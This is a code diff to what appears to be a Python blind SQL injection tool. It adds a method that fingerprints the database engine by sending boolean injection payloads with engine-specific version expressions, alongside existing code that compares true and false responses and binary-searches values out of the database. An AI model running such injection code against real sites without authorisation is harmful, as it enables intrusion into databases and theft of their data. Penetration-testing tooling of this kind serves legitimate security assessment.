@@ -1,6 +1,6 @@
 from core.Analyzer import Analyzer
 from core.Requester import Requester
-from utils.constants import DIFFER_LENGTH_BOOL, InjectionContext
+from utils.constants import DIFFER_LENGTH_BOOL, InjectionContext, fingerprints
 
 
 class BooleanInjector:
@@ -23,6 +23,27 @@ class BooleanInjector:
         self.requester = requester
         self.analyzer = analyzer
 
+    def detect_database_engine(self, param: str, ctx: InjectionContext) -> str:
+        """
+        Detect the database engine by testing engine-specific version
+        expressions and checking whether the resulting query produces
+        the same kind of response as when the condition of the query is true.
+
+        ***This method should only be used if the boolean injection test has succeeded.
+        """
+        r_true = self.requester.send({param: f"{ctx.prefix}AND 1=1{ctx.suffix}"})
+
+        for engine, fingerprint in fingerprints.items():
+            payload = f"{ctx.prefix}AND {fingerprint.version} IS NOT NULL{ctx.suffix}"
+            r_version = self.requester.send({param: payload})
+
+            # If the response with the version doesn't differ to a valid response,
+            # it means that the database-specific version expression has worked.
+            if not self.analyzer.responses_differ(r_true, r_version, DIFFER_LENGTH_BOOL):
+                return engine
+
+        return "Unknown"
+
     def test(self, url: str, param: str, ctx: InjectionContext) -> bool:
         """
         Test for boolean-based SQL injection.
@@ -33,7 +54,6 @@ class BooleanInjector:
         """
 
         r_true = self.requester.send({param: f"{ctx.prefix}AND 1=1{ctx.suffix}"})
-
         r_false = self.requester.send({param: f"{ctx.prefix}AND 1=2{ctx.suffix}"})
 
         return self.analyzer.responses_differ(r_true, r_false, DIFFER_LENGTH_BOOL)
@@ -60,12 +80,12 @@ class BooleanInjector:
             # To check if the name length is higher to the current mid value
             payload = f"{ctx.prefix}AND {expression}>{mid}{ctx.suffix}"
             response = self.requester.send({param: payload})
-            # If different then the condition is right
             # Logger.debug(f"Diff len: {diff_len}")
 
             # Add the length of the payload as baseline response doesn't contain expression
             diff_len = DIFFER_LENGTH_BOOL + len(payload)
 
+            # If different then the condition is right
             if self.analyzer.responses_differ(r_false, response, diff_len):
                 low = mid + 1
             else:
